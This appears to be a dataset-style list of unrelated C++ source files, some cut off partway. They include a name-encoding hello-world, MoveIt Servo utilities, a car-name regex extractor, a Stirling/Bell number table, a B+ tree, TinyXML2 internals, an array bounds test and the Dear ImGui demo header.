    "\ufeff//MyshkovetsArtem2007 \n//Win-1251: 4D 79 73 68 6B 6F 76 65 74 73 41 72 74 65 6D 32 30 30 37\n//UTF-8: 4D 79 73 68 6B 6F 76 65 74 73 41 72 74 65 6D 32 30 30 37\n//UTF-16: 004D 0079 0073 0068 006B 006F 0076 0065 0074 0073 0041 0072 0074 0065 006D 0032 0030 0030 0037\n//\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u0446\u0410\u0440\u0442\u0451\u043c\u0412\u0438\u0442\u0430\u043b\u044c\u0435\u0432\u0438\u04472007\n//Win-1251: CC FB F8 EA EE E2 E5 F6 C0 F0 F2 B8 EC C2 E8 F2 E0 EB FC E5 E2 E8 F7 32 30 30 37\n//UTF-8: D0 9C D1 8B D1 88 D0 BA D0 BE D1 86 D0 90 D1 80 D1 82 D0 B5 D0 BC D0 B2 D0 B8 D1 87 D0 B8 D0 B2 D0 B8 D1 87 32 30 30 37\n//UTF-16: 041C 044B 0448 043A 043E 0432 0435 0446 0410 0440 0442 0450 043C 0412 0438 0442 0430 043B 044C 0435 0432 0438 0447 0032 0030 0030 0037\n//\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u04462007Artem\n//Win-1251: CC FB F8 EA EE E2 E5 F6 32 30 30 37 41 72 74 65 6D\n//UTF-8: D0 9C D1 8B D1 88 D0 BA D0 BE D1 86 32 30 30 37 41 72 74 65 6D\n//UTF-16: 041C 044B 0448 043A 043E 0432 0435 0446 0032 0030 0030 0037 0041 0072 0074 0065 006D\n#include <iostream>\n\nint main()\n{\n    int number = 0x12345678;\n    char hello[] = \"Hello, \";\n    char lfie[] = \"MyshkovetsArtem2007\";\n    char rfie[] = \"\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u0446\u0410\u0440\u0442\u0451\u043c\u0412\u0438\u0442\u0430\u043b\u044c\u0435\u0432\u0438\u04472007\";\n    char lr[] = \"\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u04462007Artem\";\n\n    wchar_t Lfie[] = L\"MyshkovetsArtem2007\";\n    wchar_t Rfie[] = L\"\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u0446\u0410\u0440\u0442\u0451\u043c\u0412\u0438\u0442\u0430\u043b\u044c\u0435\u0432\u0438\u04472007\";\n    wchar_t LR[] = L\"\u041c\u044b\u0448\u043a\u043e\u0432\u0435\u04462007Artem\";\n    std::cout << hello << lfie << std::endl;\n    return 0;\n}",
    "// Copyright 2022 PickNik Inc.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are met:\n//\n//    * Redistributions of source code must retain the above copyright\n//      notice, this list of conditions and the following disclaimer.\n//\n//    * Redistributions in binary form must reproduce the above copyright\n//      notice, this list of conditions and the following disclaimer in the\n//      documentation and/or other materials provided with the distribution.\n//\n//    * Neither the name of the PickNik Inc. nor the names of its\n//      contributors may be used to endorse or promote products derived from\n//      this software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\n// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n// POSSIBILITY OF SUCH DAMAGE.\n\n/* Author    : Andy Zelenak\n   Desc      : Free functions. We keep them in a separate translation unit to reduce .o filesize\n   Title     : utilities.cpp\n   Project   : moveit_servo\n*/\n\n#include <moveit_servo/utilities.h>\n\nnamespace moveit_servo\n{\nnamespace\n{\nstatic const rclcpp::Logger LOGGER = rclcpp::get_logger(\"moveit_servo.utilities\");\nconstexpr auto ROS_LOG_THROTTLE_PERIOD = std::chrono::milliseconds(3000).count();\n}  // namespace\n\n/** \\brief Helper function for detecting zeroed message **/\nbool isNonZero(const geometry_msgs::msg::TwistStamped& msg)\n{\n  return msg.twist.linear.x != 0.0 || msg.twist.linear.y != 0.0 || msg.twist.linear.z != 0.0 ||\n         msg.twist.angular.x != 0.0 || msg.twist.angular.y != 0.0 || msg.twist.angular.z != 0.0;\n}\n\n/** \\brief Helper function for detecting zeroed message **/\nbool isNonZero(const control_msgs::msg::JointJog& msg)\n{\n  bool all_zeros = true;\n  for (double delta : msg.velocities)\n  {\n    all_zeros &= (delta == 0.0);\n  }\n  return !all_zeros;\n}\n\n/** \\brief Helper function for converting Eigen::Isometry3d to geometry_msgs/TransformStamped **/\ngeometry_msgs::msg::TransformStamped convertIsometryToTransform(const Eigen::Isometry3d& eigen_tf,\n                                                                const std::string& parent_frame,\n                                                                const std::string& child_frame)\n{\n  geometry_msgs::msg::TransformStamped output = tf2::eigenToTransform(eigen_tf);\n  output.header.frame_id = parent_frame;\n  output.child_frame_id = child_frame;\n\n  return output;\n}\n\n/** \\brief Possibly calculate a velocity scaling factor, due to proximity of\n * singularity and direction of motion\n * @param[in] joint_model_group   The MoveIt group\n * @param[in] commanded_twist     The commanded Cartesian twist\n * @param[in] svd                 A singular value decomposition of the Jacobian\n * @param[in] pseudo_inverse      The pseudo-inverse of the Jacobian\n * @param[in] hard_stop_singularity_threshold  Halt if condition(Jacobian) > hard_stop_singularity_threshold\n * @param[in] lower_singularity_threshold      Decelerate if condition(Jacobian) > lower_singularity_threshold\n * @param[in] leaving_singularity_threshold_multiplier      Allow faster motion away from singularity\n * @param[in, out] clock          A ROS clock, for logging\n * @param[in, out] current_state  The state of the robot. Used in internal calculations.\n * @param[out] status             Singularity status\n */\ndouble velocityScalingFactorForSingularity(const moveit::core::JointModelGroup* joint_model_group,\n                                           const Eigen::VectorXd& commanded_twist,\n                                           const Eigen::JacobiSVD<Eigen::MatrixXd>& svd,\n                                           const Eigen::MatrixXd& pseudo_inverse,\n                                           const double hard_stop_singularity_threshold,\n                                           const double lower_singularity_threshold,\n                                           const double leaving_singularity_threshold_multiplier, rclcpp::Clock& clock,\n                                           moveit::core::RobotStatePtr& current_state, StatusCode& status)\n{\n  double velocity_scale = 1;\n  std::size_t num_dimensions = commanded_twist.size();\n\n  // Find the direction away from nearest singularity.\n  // The last column of U from the SVD of the Jacobian p",
    "#include <iostream>\n#include <regex>\n#include <string>\n#include <vector>\n\n#define         EXIT__SUCCESS           0\n\n// \u041a\u043b\u0430\u0441\u0441 \u0434\u043b\u044f \u0438\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u044f \u043c\u0430\u0440\u043e\u043a \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\nclass CarBrandExtractor {\npublic:\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0438\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u044f \u043c\u0430\u0440\u043e\u043a \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\n    std::vector<std::string> extractBrands(const std::string& text) {\n        std::vector<std::string> brands;\n        std::regex brandRegex(R\"((Mercedes|BMW|Audi|Toyota|Ford))\");\n        std::smatch match;\n        std::string::const_iterator searchStart(text.cbegin());\n        \n        while (std::regex_search(searchStart, text.cend(), match, brandRegex)) {\n            brands.push_back(match[0]);\n            searchStart = match.suffix().first;\n        }\n        return brands;\n    }\n};\n\n// \u041a\u043b\u0430\u0441\u0441 \u0434\u043b\u044f \u0438\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u044f \u043c\u043e\u0434\u0435\u043b\u0435\u0439 \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\nclass CarModelExtractor {\npublic:\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0438\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u044f \u043c\u043e\u0434\u0435\u043b\u0435\u0439 \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\n    std::vector<std::string> extractModels(const std::string& text) {\n        std::vector<std::string> models;\n        std::regex modelRegex(R\"((A4|C-Class|Mustang|Camry|Corolla))\");\n        std::smatch match;\n        std::string::const_iterator searchStart(text.cbegin());\n        \n        while (std::regex_search(searchStart, text.cend(), match, modelRegex)) {\n            models.push_back(match[0]);\n            searchStart = match.suffix().first;\n        }\n        return models;\n    }\n};\n\n// \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u043a\u043b\u0430\u0441\u0441 \u0434\u043b\u044f \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0438\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u0435\u043c\nclass CarInfoExtractor {\nprivate:\n    CarBrandExtractor brandExtractor;\n    CarModelExtractor modelExtractor;\n\npublic:\n    void extractCarInfo(const std::string& text) {\n        // \u0418\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u0435 \u043c\u0430\u0440\u043e\u043a \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\n        std::vector<std::string> brands = brandExtractor.extractBrands(text);\n        // \u0418\u0437\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u0435 \u043c\u043e\u0434\u0435\u043b\u0435\u0439 \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\n        std::vector<std::string> models = modelExtractor.extractModels(text);\n\n        // \u0412\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432\n        std::cout << \"Found car brands: \";\n        for (const auto& brand : brands) {\n            std::cout << brand << \" \";\n        }\n        std::cout << std::endl;\n\n        std::cout << \"Found car models: \";\n        for (const auto& model : models) {\n            std::cout << model << \" \";\n        }\n        std::cout << std::endl;\n    }\n};\n\nint main()\n{\n        std::string text = \"I saw a Mercedes C-Class and a Ford Mustang on the road. My friend drives a Toyota Camry.\";\n        \n\tCarInfoExtractor carInfoExtractor;\n    \n    \t// \u0418\u0437\u0432\u043b\u0435\u043a\u0430\u0435\u043c \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e \u043e \u043c\u0430\u0440\u043a\u0430\u0445 \u0438 \u043c\u043e\u0434\u0435\u043b\u044f\u0445 \u0430\u0432\u0442\u043e\u043c\u043e\u0431\u0438\u043b\u0435\u0439\n    \tcarInfoExtractor.extractCarInfo(text);\n\n        return EXIT__SUCCESS;\n}\n",
    "#include \"StirBellDigits.h\"\n\nStirBellDigits::StirBellDigits() {\n\tthis->F.resize(this->N, vector<unsigned int>(this->N, 0));\n\tthis->B.resize(this->N, 0);\n\tcalcStirlingDigits();\n}\n\nStirBellDigits::StirBellDigits(unsigned int N) {\n    this->N = N;\n    this->F.resize(this->N, vector<unsigned int>(this->N, 0));\n    this->B.resize(this->N, 0);\n    calcStirlingDigits();\n}\n\nbool StirBellDigits::checkStirlingDigit(int row, int column, int val) {\n    row--;\n    column--;\n    if (row >= this->N || column >= this->N)\n        return false;\n    if (this->F[row][column] == val)\n        return true;\n    else return false;\n}\n\nbool StirBellDigits::checkBellDigit(int number, int val) {\n    number--;\n    if (number >= this->N)\n        return false;\n    if(this->B[number] == val)\n        return true;\n    else return false;\n}\n\nvoid StirBellDigits::calcStirlingDigits() {\n\tfor (size_t j = 0; j < N; j++) {\n\t\tthis->F[j][0] =1;\n\t\tthis->F[j][j] = 1;\n\t}\n\tfor (size_t j = 2; j < N; j++) \n\t\tfor (size_t k = 1; k < j; k++) \n\t\t\tF[j][k] = F[j - 1][k - 1] + (k + 1) * F[j - 1][k];\t\n\n\tfor (size_t j = 0; j < N; j++)\n\t\tfor (size_t k = 0; k < N; k++)\n\t\t\tB[j] += F[j][k];    \n}\n\nvoid StirBellDigits::printTable() {\n    \n    cout << \"+-----\";\n    for (size_t j = 0; j < N; j++) {\n        cout << \"+--------\";\n    }\n    cout << \"+------------+\" << endl;\n\n    cout << \"| n\\\\k \";\n    for (size_t j = 0; j < N; j++) {\n        cout << \"| \" << setw(6) << j + 1 << \" \";\n    }\n    cout << \"|  F(n)      |\" << endl;\n\n    cout << \"+-----\";\n    for (size_t j = 0; j < N; j++) {\n        cout << \"+--------\";\n    }\n    cout << \"+------------+\" << endl;\n\n    for (size_t j = 0; j < N; j++) {\n        cout << \"| \" << setw(3) << j + 1 << \" \";\n        for (size_t k = 0; k < N; k++) {\n            if (F[j][k] != 0) {\n                cout << \"| \" << setw(6) << F[j][k] << \" \";\n            }\n            else {\n                cout << \"| \" << setw(6) << \"-\" << \" \";\n            }\n        }\n        cout << \"| \" << setw(8) << B[j] << \"   |\" << endl;\n\n        cout << \"+-----\";\n        for (size_t k = 0; k < N; k++) {\n            cout << \"+--------\";\n        }\n        cout << \"+------------+\" << endl;\n    }\n}\n",
    "#include <bits/stdc++.h>\n\n#include <iostream>\n#include <random>\n#include <utility>\n#include <vector>\n\nusing namespace std;\n\nclass Node {\n public:\n  Node(Node *parent = nullptr, bool isLeaf = false, Node *prev_ = nullptr,\n       Node *next_ = nullptr)\n      : parent(parent), isLeaf(isLeaf), prev(prev_), next(next_) {\n    if (next_) {\n      next_->prev = this;\n    }\n\n    if (prev_) {\n      prev_->next = this;\n    }\n  }\n\n  vector<int> keys;\n  Node *parent;\n\n  vector<Node *> children;\n  vector<int> values;\n  Node *next;\n  Node *prev;\n\n  bool isLeaf;\n\n  int indexOfChild(int key) {\n    for (int i = 0; i < keys.size(); i++) {\n      if (key < keys[i]) {\n        return i;\n      }\n    }\n    return keys.size();\n  }\n\n  int indexOfKey(int key) {\n    for (int i = 0; i < keys.size(); i++) {\n      if (key == keys[i]) {\n        return i;\n      }\n    }\n    return -1;\n  }\n\n  Node *getChild(int key) { return children[indexOfChild(key)]; }\n\n  void setChild(int key, vector<Node *> value) {\n    int i = indexOfChild(key);\n    keys.insert(keys.begin() + i, key);\n    children.erase(children.begin() + i);\n    children.insert(children.begin() + i, value.begin(), value.end());\n  }\n\n  tuple<int, Node *, Node *> splitInternal() {\n    Node *left = new Node(parent, false, nullptr, nullptr);\n    int mid = keys.size() / 2;\n\n    copy(keys.begin(), keys.begin() + mid, back_inserter(left->keys));\n    copy(children.begin(), children.begin() + mid + 1,\n         back_inserter(left->children));\n\n    for (Node *child : left->children) {\n      child->parent = left;\n    }\n\n    int key = keys[mid];\n    keys.erase(keys.begin(), keys.begin() + mid + 1);\n    children.erase(children.begin(), children.begin() + mid + 1);\n\n    return make_tuple(key, left, this);\n  }\n\n  int get(int key) {\n    int index = -1;\n    for (int i = 0; i < keys.size(); ++i) {\n      if (keys[i] == key) {\n        index = i;\n        break;\n      }\n    }\n\n    if (index == -1) {\n      cout << \"key \" << key << \" not found\" << endl;\n    }\n\n    return values[index];\n  }\n\n  void set(int key, int value) {\n    int i = indexOfChild(key);\n    if (find(keys.begin(), keys.end(), key) == keys.end()) {\n      keys.insert(keys.begin() + i, key);\n      values.insert(values.begin() + i, value);\n    } else {\n      values[i - 1] = value;\n    }\n  }\n\n  tuple<int, Node *, Node *> splitLeaf() {\n    Node *left = new Node(parent, true, prev, this);\n    int mid = keys.size() / 2;\n\n    left->keys = vector<int>(keys.begin(), keys.begin() + mid);\n    left->values = vector<int>(values.begin(), values.begin() + mid);\n\n    keys.erase(keys.begin(), keys.begin() + mid);\n    values.erase(values.begin(), values.begin() + mid);\n\n    return make_tuple(keys[0], left, this);\n  }\n};\n\nclass BPlusTree {\n public:\n  BPlusTree(int _maxCapacity = 4) {\n    root = new Node(nullptr, true, nullptr, nullptr);\n    maxCapacity = _maxCapacity > 2 ? _maxCapacity : 2;\n    minCapacity = maxCapacity / 2;\n    depth = 0;\n  }\n\n  Node *root;\n  int maxCapacity;\n  int minCapacity;\n  int depth;\n\n  Node *findLeaf(int key) {\n    Node *node = root;\n    while (!node->isLeaf) {\n      node = node->getChild(key);\n    }\n    return node;\n  }\n\n  int get(int key) { return findLeaf(key)->get(key); }\n\n  void set(int key, int value) {\n    Node *leaf = findLeaf(key);\n    leaf->set(key, value);\n    if (leaf->keys.size() > maxCapacity) {\n      insert(leaf->splitLeaf());\n    }\n  }\n\n  void insert(tuple<int, Node *, Node *> result) {\n    int key = std::get<0>(result);\n    Node *left = std::get<1>(result);\n    Node *right = std::get<2>(result);\n    Node *parent = right->parent;\n    if (parent == nullptr) {\n      left->parent = right->parent = root =\n          new Node(nullptr, false, nullptr, nullptr);\n      depth += 1;\n      root->keys = {key};\n      root->children = {left, right};\n      return;\n    }\n    parent->setChild(key, {left, right});\n    if (parent->keys.size() > maxCapacity) {\n      insert(parent->splitInternal());\n    }\n  }\n\n  void removeFromLeaf(int key, Node *node) {\n    int index = node->indexOfKey(key);\n    if (index == -1) {\n      cout << \"Key \" << key << \" not found! Exiting ...\" << endl;\n      exit(0);\n    }\n    node->keys.erase(node->keys.begin() + index);\n    node->values.erase(node->values.begin() + index);\n    if (node->parent) {\n      int indexInParent = node->parent->indexOfChild(key);\n      if (indexInParent)\n        node->parent->keys[indexInParent - 1] = node->keys.front();\n    }\n  }\n\n  void removeFromInternal(int key, Node *node) {\n    int index = node->indexOfKey(key);\n    if (index != -1) {\n      Node *leftMostLeaf = node->children[index + 1];\n      while (!leftMostLeaf->isLeaf)\n        leftMostLeaf = leftMostLeaf->children.front();\n\n      node->keys[index] = leftMostLeaf->keys.front();\n    }\n  }\n\n  void borrowKeyFromRightLeaf(Node *node, Node *next) {\n    node->keys.push_back(next->keys.front());\n    next->keys.erase(next->keys.begin());\n    node->values.push_back(next->values.front());\n    next->values.erase(next->values.begin());\n    for (",
    "/*\nOriginal code by Lee Thomason (www.grinninglizard.com)\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any\ndamages arising from the use of this software.\n\nPermission is granted to anyone to use this software for any\npurpose, including commercial applications, and to alter it and\nredistribute it freely, subject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must\nnot claim that you wrote the original software. If you use this\nsoftware in a product, an acknowledgment in the product documentation\nwould be appreciated but is not required.\n\n2. Altered source versions must be plainly marked as such, and\nmust not be misrepresented as being the original software.\n\n3. This notice may not be removed or altered from any source\ndistribution.\n*/\n\n#include \"utils/TinyXml.h\"\n\n#include <new>\t\t// yes, this one new style header, is in the Android SDK.\n#if defined(ANDROID_NDK) || defined(__BORLANDC__) || defined(__QNXNTO__)\n#   include <stddef.h>\n#   include <stdarg.h>\n#else\n#   include <cstddef>\n#   include <cstdarg>\n#endif\n\n#if defined(_MSC_VER) && (_MSC_VER >= 1400 ) && (!defined WINCE)\n\t// Microsoft Visual Studio, version 2005 and higher. Not WinCE.\n\t/*int _snprintf_s(\n\t   char *buffer,\n\t   size_t sizeOfBuffer,\n\t   size_t count,\n\t   const char *format [,\n\t\t  argument] ...\n\t);*/\n\tstatic inline int TIXML_SNPRINTF( char* buffer, size_t size, const char* format, ... )\n\t{\n\t\tva_list va;\n\t\tva_start( va, format );\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\n\t\tva_end( va );\n\t\treturn result;\n\t}\n\n\tstatic inline int TIXML_VSNPRINTF( char* buffer, size_t size, const char* format, va_list va )\n\t{\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\n\t\treturn result;\n\t}\n\n\t#define TIXML_VSCPRINTF\t_vscprintf\n\t#define TIXML_SSCANF\tsscanf_s\n#elif defined _MSC_VER\n\t// Microsoft Visual Studio 2003 and earlier or WinCE\n\t#define TIXML_SNPRINTF\t_snprintf\n\t#define TIXML_VSNPRINTF _vsnprintf\n\t#define TIXML_SSCANF\tsscanf\n\t#if (_MSC_VER < 1400 ) && (!defined WINCE)\n\t\t// Microsoft Visual Studio 2003 and not WinCE.\n\t\t#define TIXML_VSCPRINTF   _vscprintf // VS2003's C runtime has this, but VC6 C runtime or WinCE SDK doesn't have.\n\t#else\n\t\t// Microsoft Visual Studio 2003 and earlier or WinCE.\n\t\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\n\t\t{\n\t\t\tint len = 512;\n\t\t\tfor (;;) {\n\t\t\t\tlen = len*2;\n\t\t\t\tchar* str = new char[len]();\n\t\t\t\tconst int required = _vsnprintf(str, len, format, va);\n\t\t\t\tdelete[] str;\n\t\t\t\tif ( required != -1 ) {\n\t\t\t\t\tTIXMLASSERT( required >= 0 );\n\t\t\t\t\tlen = required;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tTIXMLASSERT( len >= 0 );\n\t\t\treturn len;\n\t\t}\n\t#endif\n#else\n\t// GCC version 3 and higher\n\t//#warning( \"Using sn* functions.\" )\n\t#define TIXML_SNPRINTF\tsnprintf\n\t#define TIXML_VSNPRINTF\tvsnprintf\n\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\n\t{\n\t\tint len = vsnprintf( 0, 0, format, va );\n\t\tTIXMLASSERT( len >= 0 );\n\t\treturn len;\n\t}\n\t#define TIXML_SSCANF   sscanf\n#endif\n\n#if defined(_WIN64)\n\t#define TIXML_FSEEK _fseeki64\n\t#define TIXML_FTELL _ftelli64\n#elif defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__) || defined(__DragonFly__) || defined(__CYGWIN__)\n\t#define TIXML_FSEEK fseeko\n\t#define TIXML_FTELL ftello\n#elif defined(__ANDROID__) && __ANDROID_API__ > 24\n\t#define TIXML_FSEEK fseeko64\n\t#define TIXML_FTELL ftello64\n#else\n\t#define TIXML_FSEEK fseek\n\t#define TIXML_FTELL ftell\n#endif\n\n\nstatic const char LINE_FEED\t\t\t\t= static_cast<char>(0x0a);\t\t\t// all line endings are normalized to LF\nstatic const char LF = LINE_FEED;\nstatic const char CARRIAGE_RETURN\t\t= static_cast<char>(0x0d);\t\t\t// CR gets filtered out\nstatic const char CR = CARRIAGE_RETURN;\nstatic const char SINGLE_QUOTE\t\t\t= '\\'';\nstatic const char DOUBLE_QUOTE\t\t\t= '\\\"';\n\n// Bunch of unicode info at:\n//\t\thttp://www.unicode.org/faq/utf_bom.html\n//\tef bb bf (Microsoft \"lead bytes\") - designates UTF-8\n\nstatic const unsigned char TIXML_UTF_LEAD_0 = 0xefU;\nstatic const unsigned char TIXML_UTF_LEAD_1 = 0xbbU;\nstatic const unsigned char TIXML_UTF_LEAD_2 = 0xbfU;\n\nnamespace tinyxml2\n{\n\nstruct Entity {\n    const char* pattern;\n    int length;\n    char value;\n};\n\nstatic const int NUM_ENTITIES = 5;\nstatic const Entity entities[NUM_ENTITIES] = {\n    { \"quot\", 4,\tDOUBLE_QUOTE },\n    { \"amp\", 3,\t\t'&'  },\n    { \"apos\", 4,\tSINGLE_QUOTE },\n    { \"lt\",\t2, \t\t'<'\t },\n    { \"gt\",\t2,\t\t'>'\t }\n};\n\n\nStrPair::~StrPair()\n{\n    Reset();\n}\n\n\nvoid StrPair::TransferTo( StrPair* other )\n{\n    if ( this == other ) {\n        return;\n    }\n    // This in effect implements the assignment operator by \"moving\"\n    // ownership (as in auto_ptr).\n\n    TIXMLASSERT( other != 0 );\n    TIXMLASSERT( other->_flags == 0 );\n    TIXMLASSERT( other->_start == 0 );\n    TIXMLASSERT( other->_end == 0 );\n\n    other->Reset();\n\n    other->_flags = _flags;\n    other->_start = _start;\n    other->_end = _e",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: dbarrene <dbarrene@student.hive.fi>        +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/09/18 11:21:56 by dbarrene          #+#    #+#             */\n/*   Updated: 2024/09/18 14:59:04 by dbarrene         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <iostream>\n#include \"Array.hpp\"\n\nint\tmain(void)\n{\n\tstd::cout << \"hei\" << std::endl;\n\tArray<int> arr(40);\n\tArray<int> empty;\n\tarr[0] = 42;\n\tarr[1] = 42;\n\ttry{\n\t\tarr[80] = 69;\n\t}\n\tcatch(std::exception& e){\n\t\tstd::cout << \"too high bounds exception caught\" << std::endl;\n\t}\n\ttry{\n\t\tempty[-1] = 69;\n\t}\n\tcatch(std::exception& e){\n\t\tstd::cout << \"too low bounds exception caught\" << std::endl;\n\t}\n\tstd::cout << \"size of empty: \" << empty.size() << std::endl;\n\tstd::cout << \"size of arr: \" << arr.size() << std::endl;\n}\n",
    "// dear imgui, v1.89.5 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// -------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n// -------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Exam",
